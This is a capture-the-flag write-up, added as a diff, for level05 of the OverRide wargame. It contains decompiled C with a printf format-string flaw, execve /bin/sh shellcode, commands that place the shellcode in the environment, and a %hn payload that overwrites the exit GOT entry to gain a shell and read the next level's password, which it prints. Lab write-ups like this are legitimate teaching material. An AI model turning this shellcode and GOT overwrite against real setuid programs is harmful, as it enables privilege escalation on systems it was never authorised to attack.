@@ -1,0 +1,93 @@
+
+```bash
+level05@OverRide:~$ ls -l
+total 8
+-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
+level05@OverRide:~$ file level05 
+level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
+```
+
+Reversed in c:
+```c
+int __noreturn main(void)
+{
+  char s[100]; // [esp+28h] [ebp-70h] BYREF
+
+  fgets(s, 100, stdin);
+  for (unsigned int i = 0; i < strlen(s); ++i )
+  {
+    if (s[i] > 'A' && s[i] <= 'Z')
+    {
+      s[i] ^= 0x20u;
+    }
+  }
+  printf(s);
+  exit(0);
+}
+```
+
+Here it's a printf vulnerability.
+
+First we can write our shellcode:
+7:  31 c0                   xor    eax,eax
+9:  31 d2                   xor    edx,edx
+b:  50                      push   eax
+c:  68 2f 2f 73 68          push   0x68732f2f
+11: 68 2f 62 69 6e          push   0x6e69622f
+16: 89 e3                   mov    ebx,esp
+18: 50                      push   eax
+19: 53                      push   ebx
+1a: 89 e1                   mov    ecx,esp
+1c: b0 0b                   mov    al,0xb
+1e: cd 80                   int    0x80 
+"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+
+We gonna write this shellcode in the env, because the xor in the string is anoing and he prefere not change the stack too much:
+```bash
+printf '\x90%.0s' {1..100} > /tmp/level05_shell_code
+echo -ne "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" >> /tmp/level05_shell_code
+export PAYLOAD="$(cat /tmp/level05_shell_code)"
+```
+
+We fond the PAYLOAD in the env:
+```bash
+level05@OverRide:~$ env | grep PAYLOAD
+PAYLOAD=1�1�Ph//shh/bin��PS��
+
+level05@OverRide:~$ gdb level05
+(gdb) b main
+(gdb) run
+Breakpoint 1, 0x08048449 in main ()
+(gdb) call (void *)getenv("PAYLOAD")
+$1 = (void *) 0xffffded6
+```
+
+Let's find the with args in printf we write too:
+```bash
+level05@OverRide:~$ ./level05 
+zzzz %x %x %x %x %x %x %x %x %x %x
+zzzz 64 f7fcfac0 f7ec3add ffffd65f ffffd65e 0 ffffffff ffffd6e4 f7fdb000 7a7a7a7a
+```
+
+And the address of the exit in the plt:
+```bash
+level05@OverRide:~$ readelf --all level05 | grep exit
+080497e0  00000407 R_386_JUMP_SLOT   00000000   exit
+```
+
+we write the payload to overwrite the value of the got of exit and make it point to the shellcode in the env:
+```bash
+echo -ne "\xe0\x97\x04\x08" > /tmp/level05 # address of the exit got 0x80497e0
+echo -ne "\xe2\x97\x04\x08" >> /tmp/level05 # address of the exit got 0x80497e4
+echo -ne "%57140x" >> /tmp/level05 # the address of the shellcode 0xffffdf3c (0xdf3c) - 8 = 57140
+echo -ne "%10\$hn" >> /tmp/level05
+echo -ne "%8387x" >> /tmp/level05
+echo -ne "%11\$hn" >> /tmp/level05 # (0xffff) - 8 - 57140 = 8387 
+echo -ne "\x0" >> /tmp/level05
+```
+
+```bash
+level05@OverRide:~$ cat /tmp/level05 - | ./level05
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
